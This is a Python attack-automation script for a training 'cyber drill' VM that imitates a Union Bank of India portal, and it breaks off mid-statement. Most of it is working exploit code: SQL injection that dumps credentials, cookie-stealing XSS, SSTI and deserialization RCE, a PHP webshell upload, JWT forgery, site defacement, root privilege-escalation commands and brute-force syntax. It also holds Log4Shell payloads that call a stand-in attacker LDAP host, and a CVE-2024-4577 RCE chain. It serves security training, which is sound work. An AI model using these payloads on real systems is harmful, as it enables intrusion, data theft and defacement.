#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║   Union Bank of India – Cyber Drill VM                                      ║
║   Automated Attack Scenario Demonstration Script                            ║
║   Platform: Kali Linux                                                      ║
║                                                                              ║
║   USAGE:                                                                     ║
║     python3 cyber_drill_exploit.py [target_ip]                              ║
║     python3 cyber_drill_exploit.py 192.168.1.50                             ║
║                                                                              ║
║   ⚠  FOR AUTHORISED SECURITY ASSESSMENT IN ISOLATED NETWORKS ONLY ⚠        ║
╚══════════════════════════════════════════════════════════════════════════════╝

Attack Scenarios
─────────────────────────────────────────────────────────────────────────────
 1   SQL Injection – Error-Based & UNION credential dump
 2   Second-Order SQL Injection
 3   Reflected XSS                               [browser]
 4   Stored XSS                                  [browser]
 5   SSTI Detection + RCE                        [browser + terminal]
 6   Credential Stuffing / No Account Lockout    [terminal]
 7   PHP Object Injection – XSS + RCE gadgets    [browser + terminal]
 8   Unrestricted File Upload → Webshell RCE     [terminal]
 9   JWT Algorithm None Bypass                   [browser + terminal]
10   Unauthenticated Internal API                [browser]
11   Sensitive File Exposure                     [browser]
12   Web Defacement                              [browser + terminal]
13   Privilege Escalation (Cron + SUID + Sudo)   [terminal]
14   Log4Shell CVE-2021-44228                    [terminal – real VM]
15   PHP-CGI Argument Injection CVE-2024-4577    [browser + terminal]
─────────────────────────────────────────────────────────────────────────────
"""

import sys, os, time, json, subprocess, base64, urllib.parse, re
import requests
from pathlib import Path

# ─── CONFIG ──────────────────────────────────────────────────────────────────
TARGET     = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
BASE       = f"http://{TARGET}"
CGI_BASE   = f"http://{TARGET}:8888"
ADMIN_USER = "admin"
ADMIN_PASS = "Admin@123"
CLERK_USER = "priya_m"
CLERK_PASS = "Clerk@2024"

# ─── COLOURS ─────────────────────────────────────────────────────────────────
R   = "\033[0;31m";  G   = "\033[0;32m";  Y   = "\033[1;33m"
C   = "\033[0;36m";  B   = "\033[0;34m";  M   = "\033[0;35m"
W   = "\033[1;37m";  DIM = "\033[2m";     NC  = "\033[0m"

# ─── UI HELPERS ──────────────────────────────────────────────────────────────
def banner():
    print(f"""
{R}╔══════════════════════════════════════════════════════════════════════════╗
║   Union Bank of India – Cyber Drill Automated Exploit Demonstration     ║
║   Main portal  : {BASE:<54}║
║   CGI portal   : {CGI_BASE:<54}║
║   ⚠  AUTHORISED USE IN ISOLATED NETWORKS ONLY                          ⚠  ║
╚══════════════════════════════════════════════════════════════════════════╝{NC}
""")

def menu():
    print(f"\n{C}{'─'*68}{NC}")
    print(f"{W}  Attack Scenarios:{NC}")
    for num, title, _ in SCENARIOS:
        clean = re.sub(r'\s*\[.*?\]', '', title)
        tags  = re.findall(r'\[([^\]]+)\]', title)
        tag   = f" {DIM}[{tags[0]}]{NC}" if tags else ""
        print(f"  {G}{num:>2}{NC}  {clean}{tag}")
    print(f"\n  {W}Commands:{NC}")
    print(f"  {Y}all{NC}       Run all scenarios in sequence")
    print(f"  {Y}1–15{NC}      Run a specific scenario")
    print(f"  {Y}status{NC}    Check portal connectivity")
    print(f"  {Y}q / exit{NC}  Quit\n")

def section(num, title):
    print(f"\n{C}{'═'*72}{NC}")
    print(f"{W}  ATTACK VECTOR {num}: {title}{NC}")
    print(f"{C}{'═'*72}{NC}")

def info(msg):    print(f"{B}[*]{NC} {msg}")
def success(msg): print(f"{G}[+]{NC} {msg}")
def warn(msg):    print(f"{Y}[!]{NC} {msg}")
def err(msg):     print(f"{R}[✗]{NC} {msg}")
def step(n, msg): print(f"\n{W}  Step {n}:{NC} {msg}")

def cmd_show(cmd_str):
    print(f"\n{Y}  $ {cmd_str}{NC}")

def run_cmd(cmd_str, capture=False):
    cmd_show(cmd_str)
    if capture:
        r = subprocess.run(cmd_str, shell=True, capture_output=True, text=True)
        return r.stdout.strip()
    subprocess.run(cmd_str, shell=True)

def show_output(label, data, truncate=900):
    pretty = json.dumps(data, indent=2) if isinstance(data, (dict, list)) else str(data)
    if len(pretty) > truncate:
        pretty = pretty[:truncate] + f"\n  {DIM}... (truncated – {len(str(data))} chars total){NC}"
    print(f"\n{G}  ── {label} ──{NC}")
    for line in pretty.splitlines():
        print(f"  {line}")

def open_browser(url, wait_msg=""):
    info(f"Opening browser → {url}")
    if wait_msg:
        info(wait_msg)
    for b in ["firefox", "chromium", "chromium-browser", "google-chrome", "xdg-open"]:
        if subprocess.run(f"which {b}", shell=True, capture_output=True).returncode == 0:
            subprocess.Popen([b, url], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            break
    else:
        warn(f"No browser found – visit manually: {url}")
    time.sleep(1)

def prompt_next():
    """
    Print the between-scenarios prompt.
    Returns:
      True          → continue to the next scenario in sequence
      str (digit)   → jump to that scenario number
      (never returns on quit – calls sys.exit)
    """
    print(f"\n{M}  [ENTER] continue  |  [1-15] jump to scenario  |  [q] quit: {NC}", end="", flush=True)
    try:
        ans = input().strip().lower()
    except (EOFError, KeyboardInterrupt):
        print(f"\n{Y}  Interrupted.{NC}\n")
        sys.exit(0)
    if ans in ("q", "quit", "exit"):
        print(f"\n{Y}  Exiting.{NC}\n")
        sys.exit(0)
    if ans.isdigit() and ans in SCENARIO_MAP:
        return ans
    return True

# ─── SESSION HELPERS ─────────────────────────────────────────────────────────
def get_session(username=None, password=None):
    username = username or ADMIN_USER
    password = password or ADMIN_PASS
    s = requests.Session()
    s.headers.update({"User-Agent": "CyberDrill-Demo/2.0"})
    s.get(f"{BASE}/", timeout=10)
    resp = s.post(f"{BASE}/", data={"username": username, "password": password},
                  allow_redirects=False, timeout=10)
    if resp.status_code == 302 and "dashboard" in resp.headers.get("Location", ""):
        s.get(f"{BASE}/dashboard.php", timeout=10)
        success(f"Authenticated as {username}")
    else:
        warn(f"Login response HTTP {resp.status_code} – session may be partial")
    return s

def cookie_str(s):
    return f"PHPSESSID={s.cookies.get('PHPSESSID', '')}"

def check_connectivity():
    print(f"\n{W}  Connectivity check:{NC}")
    checks = [
        (f"{BASE}/",               "Main portal     (port 80)"),
        (f"{BASE}/api/internal.php","Internal API    (port 80)"),
        (f"{CGI_BASE}/index.php",  "CGI portal      (port 8888)"),
    ]
    for url, label in checks:
        try:
            r = requests.get(url, timeout=5)
            print(f"  {G}✓  HTTP {r.status_code}{NC}  {label}")
        except Exception as e:
            print(f"  {R}✗  {e}{NC}  {label}")
    print()

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

def attack_1():
    section(1, "API-Based SQL Injection – Error-Based & UNION Credential Dump")

    step(1, "Confirm endpoint is live")
    r = requests.get(f"{BASE}/api/accounts.php?api=get_user&acc_no=1", timeout=10)
    show_output("Normal acc_no=1 response", r.json())

    step(2, "Trigger error-based injection (single quote)")
    cmd_show(f"curl -s '{BASE}/api/accounts.php?api=get_user&acc_no=1%27'")
    r = requests.get(f"{BASE}/api/accounts.php?api=get_user&acc_no=1'", timeout=10)
    d = r.json()
    show_output("Error-based SQLi", d)
    if "error" in d or "message" in d:
        success("SQL syntax error in JSON response – parameter is injectable")

    step(3, "UNION credential dump – 16 columns (accounts + users join)")
    union_url = (f"{BASE}/api/accounts.php?api=get_user"
                 "&acc_no=0 UNION SELECT 1,username,password,4,5,6,7,8,9,10,11,12,13,14,15,16 FROM users--")
    cmd_show(f"curl -s '{union_url}'")
    r = requests.get(union_url, timeout=10)
    d = r.json()
    if d.get("data"):
        print(f"\n{G}  ── Dumped credentials ──{NC}")
        for row in d["data"]:
            print(f"  {G}✓{NC}  {row.get('account_number','?'):12}  MD5: {row.get('account_holder','?')}")

    step(4, "GROUP_CONCAT – all hashes in one row")
    gc_url = (f"{BASE}/api/accounts.php?api=get_user"
              "&acc_no=0 UNION SELECT 1,GROUP_CONCAT(username||':'||password),3,4,5,6,7,8,9,10,11,12,13,14,15,16 FROM users--")
    r = requests.get(gc_url, timeout=10)
    creds = r.json().get("data", [{}])[0].get("account_number", "")
    if creds:
        print(f"\n{G}  All credentials:{NC}")
        for pair in creds.split(","):
            print(f"  {G}→{NC}  {pair}")

    step(5, "API login bypass – no valid password needed")
    r = requests.post(f"{BASE}/api/auth.php?action=login",
                      data={"username": "admin'-- ", "password": "anything"}, timeout=10)
    d = r.json()
    show_output("Login bypass", d)
    if d.get("status") == "success":
        success("Auth bypass! JWT obtained without knowing the password.")


def attack_2():
    section(2, "Second-Order SQL Injection via Beneficiary Nickname")

    s = get_session()

    step(1, "Store malicious payload as nickname via prepared statement")
    payload = "' OR '1'='1"
    r = s.post(f"{BASE}/transfers.php", data={
        "action": "add_beneficiary", "beneficiary_name": "Second-Order Victim",
        "beneficiary_account": "55555555555", "beneficiary_ifsc": "SBIN0001234",
        "beneficiary_bank": "State Bank of India", "nickname": payload,
    }, timeout=10)
    if "Beneficiary added" in r.text:
        success(f"Stored safely via prepared stmt: {payload}")

    step(2, "Get the new beneficiary ID")
    r2 = requests.get(f"{BASE}/api/internal.php?action=execute_query"
                      "&query=SELECT MAX(id) as id FROM beneficiaries", timeout=10)
    ben_id = r2.json().get("data", [{}])[0].get("id", "1")
    success(f"Beneficiary ID: {ben_id}")

    step(3, "Trigger – nickname concatenated into a live SQL query on retrieval")
    cmd_show(f"curl -s '{BASE}/api/accounts.php?api=beneficiary_transactions&ben_id={ben_id}'")
    r3 = s.get(f"{BASE}/api/accounts.php?api=beneficiary_transactions&ben_id={ben_id}", timeout=10)
    d = r3.json()
    show_output("Second-order injection result", d)
    if "debug_query" in d:
        print(f"\n{G}  Constructed query (payload now embedded):{NC}")
        print(f"  {d['debug_query'][:320]}")
        success("Confirmed: stored payload injected into a live SQL query")
    elif d.get("transactions"):
        success(f"Boolean OR '1'='1 returned {len(d['transactions'])} transactions")


def attack_3():
    section(3, "Reflected XSS – render_account endpoint  [BROWSER]")

    payload = "<script>alert('Reflected XSS\\nCookie: '+document.cookie)</script>"
    xss_url = f"{BASE}/api/accounts.php?api=render_account&acc_no={urllib.parse.quote(payload)}"

    step(1, "Verify reflection – no htmlspecialchars() applied")
    cmd_show(f"curl -s '{xss_url}' | grep -o 'Search:.*</h2>'")
    r = requests.get(xss_url, timeout=10)
    if "<script>alert" in r.text:
        success("Payload reflected verbatim in response")

    step(2, "Open in browser – alert fires with session cookie")
    open_browser(xss_url, "Alert dialog shows PHPSESSID cookie. Close browser when done.")

    info("img onerror alternative:")
    img_url = (f"{BASE}/api/accounts.php?api=render_account&acc_no="
               + urllib.parse.quote("<img src=x onerror=alert(document.cookie)>"))
    print(f"  {Y}{img_url}{NC}")


def attack_4():
    section(4, "Stored XSS via Internal Messaging  [BROWSER]")

    step(1, "Send malicious message body to admin (stored via prepared stmt, rendered raw)")
    s = get_session(CLERK_USER, CLERK_PASS)
    xss_body = "<img src=x onerror=\"alert('Stored XSS! Cookie: '+document.cookie)\">"
    r = s.post(f"{BASE}/messages.php", data={
        "recipient": "admin", "subject": "Quarterly Report", "body": xss_body,
    }, timeout=10)
    if "Message sent successfully" in r.text:
        success("XSS payload stored in messages table")
    info("Subject IS escaped; body is NOT – only body executes.")

    step(2, "Login as admin – XSS fires automatically on dashboard load")
    get_session(ADMIN_USER, ADMIN_PASS)
    open_browser(f"{BASE}/dashboard.php",
                 "Admin dashboard loads – XSS fires in message preview. Close browser when done.")


def attack_5():
    section(5, "Server-Side Template Injection (SSTI) – Detection + RCE")

    s = get_session()

    print(f"\n{W}  5a – Detection: {{{{7*7}}}} evaluated to 49  [BROWSER]{NC}")
    step(1, "Submit transfer with description={{7*7}}")
    s.post(f"{BASE}/transfers.php", data={
        "action": "initiate_transfer", "from_account": "10010023456789",
        "to_account": "10010034567890", "amount": "1", "description": "{{7*7}}",
    }, timeout=10)
    r_db = requests.get(f"{BASE}/api/internal.php?action=execute_query"
                        "&query=SELECT description FROM transactions ORDER BY id DESC LIMIT 1", timeout=10)
    result = r_db.json().get("data", [{}])[0].get("description", "")
    if result == "49":
        success("SSTI confirmed: {{7*7}} → 49")
    open_browser(f"{BASE}/transfers.php",
                 "Pending Transfers table shows '49' in Description (not '{{7*7}}'). Close when done.")

    print(f"\n{W}  5b – RCE payloads  [TERMINAL]{NC}")
    rce_payloads = [
        ("id",              "{{system('id')}}"),
        ("whoami",          "{{system('whoami')}}"),
        ("hostname",        "{{system('hostname')}}"),
        ("cat /etc/passwd", "{{system('cat /etc/passwd')}}"),
        ("concat bypass id","{{system(('i'~'d'))}}"),
        ("concat whoami",   "{{system(('who'~'ami'))}}"),
    ]
    for label, pl in rce_payloads:
        s.post(f"{BASE}/transfers.php", data={
            "action": "initiate_transfer", "from_account": "10010023456789",
            "to_account": "10010034567890", "amount": "1", "description": pl,
        }, timeout=10)
        r_db = requests.get(f"{BASE}/api/internal.php?action=execute_query"
                            "&query=SELECT description FROM transactions ORDER BY id DESC LIMIT 1",
                            timeout=10)
        out = r_db.json().get("data", [{}])[0].get("description", "?").strip()
        print(f"  {Y}{pl}{NC}  →  {G}{out[:120]}{NC}")
        time.sleep(0.2)


def attack_6():
    section(6, "Credential Stuffing / No Account Lockout  [TERMINAL]")

    step(1, "Fire 10 wrong passwords – no lockout triggered")
    wrong = ["letmein","password123","admin123","Welcome1","123456",
             "qwerty","abc123","Admin1234","banking@1","Union@123"]
    print(f"{Y}  Endpoint: POST {BASE}/api/auth.php?action=login{NC}\n")
    for i, pwd in enumerate(wrong, 1):
        r = requests.post(f"{BASE}/api/auth.php?action=login",
                          data={"username": ADMIN_USER, "password": pwd}, timeout=10)
        st = r.json().get("status", "?")
        print(f"  [{i:02d}] {pwd:<20} →  {R if st=='error' else G}{st}{NC}")
        time.sleep(0.08)

    step(2, f"Correct password on attempt 11 – still works, no lockout")
    r = requests.post(f"{BASE}/api/auth.php?action=login",
                      data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=10)
    d = r.json()
    if d.get("status") == "success":
        success("Login succeeded – account never locked. JWT: " + d.get("token","")[:50] + "...")

    step(3, "Hydra syntax (shown for reference, not executed)")
    cmd_show(f"hydra -l admin -P /usr/share/wordlists/rockyou.txt {TARGET} \\\n"
             f"  http-post-form '/api/auth.php?action=login"
             f":username=^USER^&password=^PASS^:Invalid credentials'")
    cmd_show(f"hydra -l lowpriv -P /usr/share/wordlists/rockyou.txt {TARGET} ssh -t 4")
    warn("Not executed – above commands are the working syntax")


def attack_7():
    section(7, "PHP Object Injection (Insecure Deserialization)")

    s = get_session()

    print(f"\n{W}  7a – Transactions gadget: XSS appended to JSON  [BROWSER]{NC}")
    xss_body = "<script>alert('PHP Object Injection XSS\\nCookie: '+document.cookie)</script>"
    xss_len  = len(xss_body)
    xss_pl   = f'O:12:"Transactions":2:{{s:11:"beneficiary";s:{xss_len}:"{xss_body}";s:6:"amount";i:100;}}'
    info(f"s:{xss_len} must exactly match payload byte count")
    print(f"  {Y}{xss_pl}{NC}")
    r = s.post(f"{BASE}/api/auth.php?action=confirm_transaction",
               data={"data": xss_pl}, timeout=10)
    if "<script>alert" in r.text:
        success("XSS appended after JSON body via __destruct()")
    open_browser(f"{BASE}/api/auth.php?action=confirm_transaction&data={urllib.parse.quote(xss_pl)}",
                 "Response ends with XSS – alert fires. Close when done.")

    print(f"\n{W}  7b – SystemCommand gadget: OS RCE  [TERMINAL]{NC}")
    for cmd_str in ["id", "whoami", "uname -a", "cat /etc/passwd"]:
        cmd_len = len(cmd_str)
        rce_pl = f'O:13:"SystemCommand":1:{{s:3:"cmd";s:{cmd_len}:"{cmd_str}";}}'
        print(f"\n  {Y}cmd={cmd_str!r}{NC}  payload: {rce_pl}")
        cmd_show(f"curl -s -X POST '{BASE}/api/auth.php?action=confirm_transaction' "
                 f"--data-urlencode 'data={rce_pl}'")
        r = s.post(f"{BASE}/api/auth.php?action=confirm_transaction",
                   data={"data": rce_pl}, timeout=10)
        raw  = r.text
        out  = raw[raw.rfind("}")+1:].strip()
        print(f"  {G}Output:{NC} {out[:200] or '(check s: length)'}")


def attack_8():
    section(8, "Unrestricted File Upload → PHP Webshell RCE  [TERMINAL]")

    s = get_session()
    ws = b"<?php echo shell_exec($_GET['cmd']); ?>"
    Path("/tmp/drill_shell.php").write_bytes(ws)
    info(f"Webshell: {ws.decode()}")

    step(1, "Upload .php file – bypasses JS-only extension check via curl")
    cmd_show(f"curl -s -b '{cookie_str(s)}' -X POST '{BASE}/upload.php' "
             f"-F 'document=@/tmp/drill_shell.php;type=image/jpeg'")
    with open("/tmp/drill_shell.php", "rb") as f:
        r = s.post(f"{BASE}/upload.php",
                   files={"document": ("drill_shell.php", f, "image/jpeg")}, timeout=10)
    if "uploaded successfully" in r.text:
        success(f"PHP webshell uploaded → {BASE}/uploads/drill_shell.php")

    step(2, "Execute OS commands via webshell")
    ws_url = f"{BASE}/uploads/drill_shell.php"
    for cmd_str in ["id","whoami","hostname","uname -a",
                    "ls -la /var/www/html/bankportal/"]:
        cmd_show(f"curl '{ws_url}?cmd={urllib.parse.quote(cmd_str)}'")
        r = requests.get(f"{ws_url}?cmd={urllib.parse.quote(cmd_str)}", timeout=10)
        print(f"  {G}[{cmd_str}]{NC}  {r.text.strip()[:200]}")
        time.sleep(0.15)

    step(3, "Read source to expose hardcoded credentials")
    r = requests.get(f"{ws_url}?cmd=cat+/var/www/html/bankportal/includes/db.php", timeout=10)
    for line in r.text.splitlines():
        if any(k in line for k in ["DB_USER","DB_PASS","JWT_SECRET","define"]):
            print(f"  {Y}{line.strip()}{NC}")


def attack_9():
    section(9, "JWT Algorithm 'none' Bypass")

    step(1, "Obtain a real JWT")
    r = requests.post(f"{BASE}/api/auth.php?action=login",
                      data={"username": ADMIN_USER, "password": ADMIN_PASS}, timeout=10)
    real_token = r.json().get("token", "")
    info(f"Real JWT (truncated): {real_token[:80]}...")

    step(2, "Forge admin token with alg:none – no secret required")
    h = base64.b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).decode().rstrip("=")
    p = base64.b64encode(json.dumps({"user_id":1,"username":"admin","role":"admin",
                                     "iat":1000,"exp":9999999999}).encode()).decode().rstrip("=")
    forged = f"{h}.{p}."
    print(f"  {Y}Header  : {h}{NC}")
    print(f"  {Y}Payload : {p}{NC}")
    print(f"  {Y}Sig     : (empty){NC}")
    print(f"  {Y}Token   : {forged}{NC}")

    step(3, "Verify – portal accepts forged token as 'valid'")
    r = requests.get(f"{BASE}/api/auth.php?action=verify_token&token={forged}", timeout=10)
    d = r.json()
    show_output("Verification result", d)
    if d.get("status") == "valid":
        success("alg:none accepted – forged as admin without knowing the secret!")

    step(4, "Expose JWT secret via unauthenticated internal API")
    r2 = requests.get(f"{BASE}/api/internal.php?action=get_config", timeout=10)
    jwt_secret = r2.json().get("config", {}).get("jwt_secret", "?")
    success(f"JWT secret from /api/internal.php → {jwt_secret}")

    open_browser(f"{BASE}/api/auth.php?action=verify_token&token={forged}",
                 'Browser shows {"status":"valid"} for forged token. Close when done.')


def attack_10():
    section(10, "Unauthenticated Internal API  [BROWSER]")

    step(1, "Discover available actions (no auth, no params)")
    r = requests.get(f"{BASE}/api/internal.php", timeout=10)
    show_output("Available actions", r.json())

    step(2, "Dump all application secrets")
    r2 = requests.get(f"{BASE}/api/internal.php?action=get_config", timeout=10)
    print(f"\n{G}  ── Secrets ──{NC}")
    for k, v in r2.json().get("config", {}).items():
        print(f"  {G}✓{NC}  {k}: {Y}{v}{NC}")

    step(3, "Dump all user accounts with MD5 hashes")
    r3 = requests.get(f"{BASE}/api/internal.php?action=get_all_users", timeout=10)
    print(f"\n{G}  ── Users ──{NC}")
    for u in r3.json().get("users", []):
        print(f"  {G}✓{NC}  {u.get('username','?'):12}  MD5: {u.get('password','?')}  role: {u.get('role','?')}")

    step(4, "Escalate customer1 to admin via arbitrary SQL execution")
    r4 = requests.get(f"{BASE}/api/internal.php?action=execute_query"
                      "&query=UPDATE users SET role='admin' WHERE username='customer1'", timeout=10)
    if r4.json().get("status") == "success":
        success("customer1 promoted to admin via unauthenticated SQL endpoint")
        requests.get(f"{BASE}/api/internal.php?action=execute_query"
                     "&query=UPDATE users SET role='customer' WHERE username='customer1'", timeout=10)
        info("(reverted back to customer)")

    step(5, "Server reconnaissance")
    r5 = requests.get(f"{BASE}/api/internal.php?action=system_info", timeout=10)
    for k, v in r5.json().get("server", {}).items():
        print(f"  {G}✓{NC}  {k}: {v}")

    open_browser(f"{BASE}/api/internal.php?action=get_config",
                 "Browser shows all secrets with zero auth. Close when done.")


def attack_11():
    section(11, "Sensitive File & Information Disclosure  [BROWSER]")

    files = [
        ("/.env",                    "All credentials – DB, JWT, API key, SSH"),
        ("/backup/db_backup_2024.sql","MySQL root & app passwords in SQL comments"),
        ("/backup/",                 "Directory listing – backup folder"),
        ("/error.php",               "PHP/Apache version + document root"),
    ]
    for path, desc in files:
        url = f"{BASE}{path}"
        step(path, desc)
        cmd_show(f"curl -s '{url}' | head -15")
        r = requests.get(url, timeout=10)
        for line in r.text.splitlines()[:12]:
            print(f"    {line}")
        print(f"  HTTP {r.status_code}" +
              (f" → {G}ACCESSIBLE{NC}" if r.status_code == 200 else ""))

    info("Response header version leakage:")
    r = requests.head(f"{BASE}/", timeout=10)
    for h in ["Server","X-Powered-By","Content-Security-Policy","X-Frame-Options"]:
        val = r.headers.get(h, f"{R}(not set){NC}")
        print(f"  {h}: {val}")

    open_browser(f"{BASE}/.env", ".env file contains all credentials. Close when done.")


def attack_12():
    section(12, "Web Defacement via SSTI RCE  [BROWSER + TERMINAL]")

    s = get_session()

    step(1, "View portal BEFORE defacement")
    open_browser(f"{BASE}/", "Normal UBI portal. Close browser when done.")

    step(2, "Overwrite index.php via SSTI system() call in transfer description")
    html = ("<html><body style='background:#000;text-align:center'>"
            "<h1 style='color:red;font-size:80px;margin-top:20%'>DEFACED BY ATTACKER</h1>"
            "<p style='color:#fff'>Compromised – UBI Cyber Drill</p></body></html>")
    payload = f"{{{{system('echo \\'{html}\\' > /var/www/html/bankportal/index.php')}}}}"
    info(f"SSTI defacement payload (truncated): {payload[:80]}...")
    s.post(f"{BASE}/transfers.php", data={
        "action": "initiate_transfer", "from_account": "10010023456789",
        "to_account": "10010034567890", "amount": "1", "description": payload,
    }, timeout=10)
    time.sleep(1)
    r2 = requests.get(f"{BASE}/", timeout=10)
    if "DEFACED" in r2.text:
        success("index.php overwritten via SSTI RCE!")
    open_browser(f"{BASE}/", "Defaced portal. Close when done.")

    step(3, "Restore note")
    warn("Re-run setup.sh on the VM to fully restore index.php after this demo.")


def attack_13():
    section(13, "Privilege Escalation – Cron + SUID + Sudo GTFOBins  [TERMINAL]")

    print(f"\n{W}  Path 1 – SUID logviewer command injection{NC}")
    out = run_cmd("ls -la /usr/local/bin/logviewer 2>/dev/null || echo 'not found'", capture=True)
    print(f"  {out}")
    if "-rws" in out:
        success("SUID bit confirmed on logviewer")
        run_cmd("/usr/local/bin/logviewer '/etc/passwd; id'")
    else:
        info("Run as lowpriv via SSH:")
        cmd_show("/usr/local/bin/logviewer '/dev/null; bash -p'")

    print(f"\n{W}  Path 2 – Cron job abuse (world-writable pwn.sh){NC}")
    out = run_cmd("ls -la /home/lowpriv/pwn.sh 2>/dev/null || echo 'not found'", capture=True)
    print(f"  {out}")
    run_cmd("cat /etc/cron.d/maintenance-job 2>/dev/null || echo 'cron file not found'")
    if "rwxrwxrwx" in out:
        success("pwn.sh chmod 777 – overwrite and wait for root cron execution")
        print(f"  {Y}$ echo 'cp /bin/bash /tmp/rootbash && chmod u+s /tmp/rootbash' > /home/lowpriv/pwn.sh{NC}")
        print(f"  {Y}$ sleep 60 && /tmp/rootbash -p{NC}")

    print(f"\n{W}  Path 3 – Sudo GTFOBins{NC}")
    print(f"  {Y}$ sudo /usr/bin/python3 -c 'import os; os.execv(\"/bin/bash\",[\"/bin/bash\"])'  →  root{NC}")
    print(f"  {Y}$ sudo /usr/bin/vim -c ':!bash'                                               →  root{NC}")
    print(f"  {Y}$ sudo /usr/bin/find / -exec /bin/bash \\; -quit                              →  root{NC}")


def attack_14():
    section(14, "Log4Shell – CVE-2021-44228 (Tomcat port 8080, real VM)  [TERMINAL]")

    warn("Tomcat runs on port 8080 in real VM deployments. Commands shown for reference.")
    info("Log4j 2.14.1 – every user-controlled input logged via logger.info()")

    payloads = [
        ("Query param",     f"curl 'http://{TARGET}:8080/bankingapp/?query=${{jndi:ldap://ATTACKER:1389/exploit}}'"),
        ("User-Agent",      f"curl -H 'User-Agent: ${{jndi:ldap://ATTACKER:1389/a}}' http://{TARGET}:8080/bankingapp/"),
        ("X-Forwarded-For", f"curl -H 'X-Forwarded-For: ${{jndi:ldap://ATTACKER:1389/a}}' http://{TARGET}:8080/bankingapp/"),
        ("Login username",  f"curl -X POST 'http://{TARGET}:8080/bankingapp/?action=login' -d 'username=${{jndi:ldap://ATTACKER:1389/a}}&password=x'"),
        ("Obfuscated",      f"curl 'http://{TARGET}:8080/bankingapp/?query=${{${{lower:j}}ndi:${{lower:l}}dap://ATTACKER:1389/a}}'"),
    ]
    for label, cmd_str in payloads:
        print(f"\n  {Y}[{label}]{NC}")
        cmd_show(cmd_str)

    info("Setup rogue LDAP on Kali:")
    cmd_show("java -jar JNDIExploit.jar -i ATTACKER_IP -p 8888 -l 1389")

    try:
        r = requests.get(f"http://{TARGET}:8080/bankingapp/", timeout=3)
        success(f"Tomcat reachable – HTTP {r.status_code}")
    except Exception:
        warn(f"Tomcat not reachable at {TARGET}:8080 (expected in sandbox; available in real VM)")


def attack_15():
    section(15, "PHP-CGI Argument Injection – CVE-2024-4577  [BROWSER + TERMINAL]")

    info(f"Target: Customer Support Portal at {CGI_BASE}")
    info("Vulnerability: U+00AD (soft-hyphen, %AD) is normalised to regular hyphen (-)")
    info("after Apache's CVE-2012-1823 argument-injection filter, injecting CLI flags")
    info("into the php-cgi binary invocation.")
    print(f"""
{Y}  Bypass chain:{NC}
  CVE-2012-1823 (patched) : GET /index.php?-d+allow_url_include=1   ← blocked
  CVE-2024-4577 (bypass)  : GET /index.php?%ADd+allow_url_include=1  ← %AD→- after filter
  Result                  : php-cgi receives -d allow_url_include=1 as CLI argument
""")

    # ── Step 1: Connectivity ─────────────────────────────────────────────────
    step(1, "Confirm CGI portal is live")
    cmd_show(f"curl -s -o /dev/null -w '%{{http_code}}' {CGI_BASE}/index.php")
    try:
        r = requests.get(f"{CGI_BASE}/index.php", timeout=8)
        sapi = re.search(r'PHP SAPI.*?:\s*</strong>\s*([^<\s|]+)', r.text)
        sapi_val = sapi.group(1) if sapi else "unknown"
        success(f"CGI portal accessible (HTTP {r.status_code}, SAPI: {sapi_val})")
    except requests.exceptions.ConnectionError:
        warn(f"Cannot reach {CGI_BASE} – port 8888 not open on this target.")
        warn("Run setup.sh on the VM to enable the CGI portal. Skipping live demo.")
        return

    # ── Step 2: Source disclosure via -s ────────────────────────────────────
    step(2, "Source code disclosure via injected -s flag")
    src_url = f"{CGI_BASE}/index.php?%ADs"
    info("Payload: %ADs → decoded to -s (php-cgi source display mode)")
    cmd_show(f"curl -s '{src_url}' | head -20")
    r = requests.get(src_url, timeout=8)
    shown = 0
    for line in r.text.splitlines():
        clean = re.sub(r'<[^>]+>', '', line).strip()
        if clean and any(k in clean for k in ["<?php","Customer Support","CVE","Union Bank","php"]):
            print(f"  {G}{clean[:120]}{NC}")
            shown += 1
            if shown >= 8:
                break
    if shown:
        success("PHP source code disclosed via -s injection")
    else:
        warn(f"Unexpected response – source not visible (HTTP {r.status_code})")
    open_browser(src_url, "Browser shows PHP source via -s flag injection. Close when done.")

    # ── Step 3: phpinfo via -i ───────────────────────────────────────────────
    step(3, "Full phpinfo() via injected -i flag")
    phpinfo_url = f"{CGI_BASE}/index.php?%ADi"
    info("Payload: %ADi → decoded to -i (phpinfo mode)")
    cmd_show(f"curl -s '{phpinfo_url}' | grep -E 'PHP Version|allow_url_include|DOCUMENT_ROOT' | head -5")
    r = requests.get(phpinfo_url, timeout=8)
    printed = 0
    for line in r.text.splitlines():
        stripped = re.sub(r'<[^>]+>', '', line).strip()
        if stripped and any(k in stripped for k in
                            ["PHP Version","allow_url_include","DOCUMENT_ROOT",
                             "disable_functions","Server API","PHP_SELF"]):
            print(f"  {G}{stripped[:120]}{NC}")
            printed += 1
            if printed >= 8:
                break
    if printed:
        success("phpinfo() disclosed via -i injection")
    open_browser(phpinfo_url, "Browser shows full phpinfo(). Close when done.")

    # ── Step 4: RCE via allow_url_include + auto_prepend_file ───────────────
    step(4, "RCE via -d allow_url_include=1 -d auto_prepend_file=php://input")
    print(f"""
  {Y}Payload:{NC}
    URL : {CGI_BASE}/index.php?%ADdallow_url_include%3d1+%ADdauto_prepend_file%3dphp://input
    Body: <?php echo shell_exec('id'); ?>

  %ADdallow_url_include%3d1        →  -dallow_url_include=1
  +                                →  argument separator
  %ADdauto_prepend_file%3dphp://input  →  -dauto_prepend_file=php://input
  POST body is read as PHP and prepended before every script execution
""")

    rce_url = (f"{CGI_BASE}/index.php"
               "?%ADdallow_url_include%3d1+%ADdauto_prepend_file%3dphp://input")

    rce_commands = [
        ("id",                        "<?php echo 'RCE::'.shell_exec('id'); ?>"),
        ("whoami",                    "<?php echo 'RCE::'.shell_exec('whoami'); ?>"),
        ("uname -a",                  "<?php echo 'RCE::'.shell_exec('uname -a'); ?>"),
        ("hostname",                  "<?php echo 'RCE::'.shell_exec('hostname'); ?>"),
        ("cat /var/www/html/bankportal/.env",
                                      "<?php echo 'RCE::'.shell_exec('cat /var/www/html/bankportal/.env'); ?>"),
    ]

    for label, php_code in rce_commands:
        cmd_show(f"curl -s '{rce_url}' \\\n"
                 f"  -X POST -H 'Content-Type: text/plain' \\\n"
                 f"  --data-binary '{php_code}'")
        try:
            r = requests.post(rce_url, data=php_code.encode(),
